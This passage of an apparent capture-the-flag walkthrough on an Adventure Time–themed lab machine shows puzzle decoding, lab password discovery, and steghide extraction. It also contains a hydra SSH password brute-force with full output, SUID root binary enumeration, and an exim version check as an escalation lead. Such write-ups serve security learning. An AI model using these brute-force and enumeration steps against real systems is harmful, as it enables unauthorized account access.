&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> BananaHead Access Pass
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> created by &lt;span class="nv">Marceline&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">======================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hi there bananaheads!!!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">So you found my file?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">But it won&lt;span class="s1">&amp;#39;t help you if you can&amp;#39;&lt;/span>t answer this question correct.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">What? I told you guys I would &lt;span class="nb">help&lt;/span> and that it wouldn&lt;span class="err">&amp;#39;&lt;/span>t cost you a thing....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Well I lied hahahaha
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ready &lt;span class="k">for&lt;/span> the question?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The key to solve this puzzle is gone
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">And you need the key to get this readable: Gpnhkse
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Did you solve the puzzle?
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I first tought that was rot13, but after seaching for a while I tried the vigenere one, which requires a key, that in this case would be “gone”&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">What is the word I&lt;span class="s1">&amp;#39;m looking for? Abadeer
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">That&amp;#39;&lt;/span>s it!!!! You solved my puzzle
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Don&lt;span class="s1">&amp;#39;t tell princess B I helped you guys!!!
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">My password is &amp;#39;&lt;/span>My friend Finn&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So we got marceline’s password&lt;/p>
&lt;p>And we enter ssh with marceline with the password that we just found.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">marceline@at:~$ ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag2 I-got-a-secret.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">marceline@at:~$ cat I-got-a-secret.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hello Finn,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I heard that you pulled a fast one over the banana guards.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">B was very upset hahahahaha.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I also heard you guys are looking &lt;span class="k">for&lt;/span> BMO&lt;span class="s1">&amp;#39;s resetcode.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">You guys broke him again with those silly games?
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">You know I like you Finn, but I don&amp;#39;&lt;/span>t want to anger B too much.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">So I will &lt;span class="nb">help&lt;/span> you a little bit...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">But you have to solve my little puzzle. Think you&lt;span class="err">&amp;#39;&lt;/span>re up &lt;span class="k">for&lt;/span> it?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hahahahaha....I know you are.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">111111111100100010101011101011111110101111111111011011011011000001101001001011111111111111001010010111100101000000000000101001101111001010010010111111110010100000000000000000000000000000000000000010101111110010101100101000000000000000000000101001101100101001001011111111111111111111001010000000000000000000000000001010111001010000000000000000000000000000000000000000000001010011011001010010010111111111111111111111001010000000000000000000000000000000001010111111001010011011001010010111111111111100101001000000000000101001111110010100110010100100100000000000000000000010101110010100010100000000000000010100000000010101111100101001111001010011001010010000001010010100101011100101001101100101001011100101001010010100110110010101111111111111111111111111111111110010100100100000000000010100010100111110010100000000000000000000000010100111111111111111110010100101111001010000000000000001010&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Apparently this is spoon code.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">The magic word you are looking &lt;span class="k">for&lt;/span> is ApplePie
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And finally we got the magic word.&lt;/p>
&lt;p>Which tells us the peppermint password.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 10.10.237.150 &lt;span class="m">31337&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ApplePie
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The password of peppermint-butler is: That Black Magic
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So now we can switch user and retrieve the flag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">su peppermint-butler
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We can see a picture in the home directory.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">find / -type f -user peppermint-butler 2&amp;gt;/dev/null | head
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/share/xml/steg.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/etc/php/zip.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/fdinfo/0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/fdinfo/1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/fdinfo/2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/fdinfo/255
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/environ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/auxv
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/proc/1779/task/1779/personality
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">peppermint-butler@at:~$ cat /usr/share/xml/steg.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I need to keep my secrets safe.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">There are people in this castle who can&amp;#39;t be trusted.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Those banana guards are not the smartest of guards.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">And that Marceline is a friend of princess Bubblegum,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">but I don&amp;#39;t trust her.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">So I need to keep this safe.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The password of my secret file is &amp;#39;ToKeepASecretSafe&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">peppermint-butler@at:~$ cat /etc/php/zip.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I need to keep my secrets safe.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">There are people in this castle who can&amp;#39;t be trusted.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Those banana guards are not the smartest of guards.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">And that Marceline is a friend of princess Bubblegum,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">but I don&amp;#39;t trust her.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">So I need to keep this safe.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The password of my secret file is &amp;#39;ThisIsReallySave&amp;#39;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Using “ToKeepASecretSafe” as a password, we are able to find a zip file in the image:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">steghide extract -sf butler-1.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter passphrase:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wrote extracted data to &amp;#34;secrets.zip&amp;#34;.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The zip is protected by a password, and we can unzip it using the other password “ThisIsReallySave”:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">unzip secrets.zip
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat secrets.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[0200 hours][upper stairs]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I was looking for my arch nemesis Peace Master,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">but instead I saw that cowering little puppet from the Ice King.....gunter.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">What was he up to, I don&amp;#39;t know.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">But I saw him sneaking in the secret lab of Princess Bubblegum.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">To be able to see what he was doing I used my spell &amp;#39;the evil eye&amp;#39; and saw him.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">He was hacking the secret laptop with something small like a duck of rubber.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I had to look closely, but I think I saw him type in something.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">It was unclear, but it was something like &amp;#39;The Ice King s????&amp;#39;.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The last 4 letters where a blur.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Should I tell princess Bubblegum or see how this all plays out?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I don&amp;#39;t know.......
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So now we know that the password starts with The Ice King s and has other 4 characters.&lt;/p>
&lt;p>I used https://scrabblewordfinder.org/5-letter-words-starting-with/s to built a text file of possible that I’ll use with hydra.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">hydra -l gunter -P passwords_gunter.txt ssh://10.10.237.150
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-07 17:39:09
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[DATA] max 16 tasks per 1 server, overall 16 tasks, 1564 login tries (l:1/p:1564), ~98 tries per task
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[DATA] attacking ssh://10.10.237.150:22/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[STATUS] 181.00 tries/min, 181 tries in 00:01h, 1388 to do in 00:08h, 16 active
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[STATUS] 124.00 tries/min, 372 tries in 00:03h, 1197 to do in 00:10h, 16 active
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[STATUS] 117.57 tries/min, 823 tries in 00:07h, 748 to do in 00:07h, 16 active
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[STATUS] 115.25 tries/min, 1383 tries in 00:12h, 188 to do in 00:02h, 16 active
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[22][ssh] host: 10.10.237.150 login: gunter password: The Ice King sucks
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1 of 1 target successfully completed, 1 valid password found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[WARNING] Writing restore file because 7 final worker threads did not complete until end.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[ERROR] 7 targets did not resolve or could not be connected
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[ERROR] 0 targets did not complete
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-07 17:51:33
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So, now we can go to the gunter home and retrieve the flag.&lt;/p>
&lt;p>Now I am going to search for root SUIDs:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">find / -user root -perm -u=s 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/pppd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/exim4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/lib/eject/dmcrypt-get-device
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/lib/policykit-1/polkit-agent-helper-1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/lib/xorg/Xorg.wrap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/pkexec
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/arping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/traceroute6.iputils
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/vmware-user-suid-wrapper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/sudo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/umount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/fusermount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/mount
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Exim is a strange file.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">exim4&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">version&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Exim&lt;/span> &lt;span class="n">version&lt;/span> &lt;span class="mf">4.90&lt;/span>&lt;span class="n">_1&lt;/span> &lt;span class="c1">#4 built 14-Feb-2018 16:01:14&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Copyright&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">University&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">Cambridge&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1995&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">The&lt;/span> &lt;span class="n">Exim&lt;/span> &lt;span class="n">Maintainers&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">contributors&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">ACKNOWLEDGMENTS&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2007&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">2017&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Berkeley&lt;/span> &lt;span class="n">DB&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Berkeley&lt;/span> &lt;span class="n">DB&lt;/span> &lt;span class="mf">5.3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">September&lt;/span> &lt;span class="mi">9&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2013&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Support&lt;/span> &lt;span class="k">for&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">crypteq&lt;/span> &lt;span class="n">iconv&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="n">IPv6&lt;/span> &lt;span class="n">GnuTLS&lt;/span> &lt;span class="n">move_frozen_messages&lt;/span> &lt;span class="n">DKIM&lt;/span> &lt;span class="n">DNSSEC&lt;/span> &lt;span class="n">Event&lt;/span> &lt;span class="n">OCSP&lt;/span> &lt;span class="n">PRDR&lt;/span> &lt;span class="n">SOCKS&lt;/span> &lt;span class="n">TCP_Fast_Open&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Lookups&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">built&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="ow">in&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="n">lsearch&lt;/span> &lt;span class="n">wildlsearch&lt;/span> &lt;span class="n">nwildlsearch&lt;/span> &lt;span class="n">iplsearch&lt;/span> &lt;span class="n">cdb&lt;/span> &lt;span class="n">dbm&lt;/span> &lt;span class="n">dbmjz&lt;/span> &lt;span class="n">dbmnz&lt;/span> &lt;span class="n">dnsdb&lt;/span> &lt;span class="n">dsearch&lt;/span> &lt;span class="n">nis&lt;/span> &lt;span class="n">nis0&lt;/span> &lt;span class="n">passwd&lt;/span>
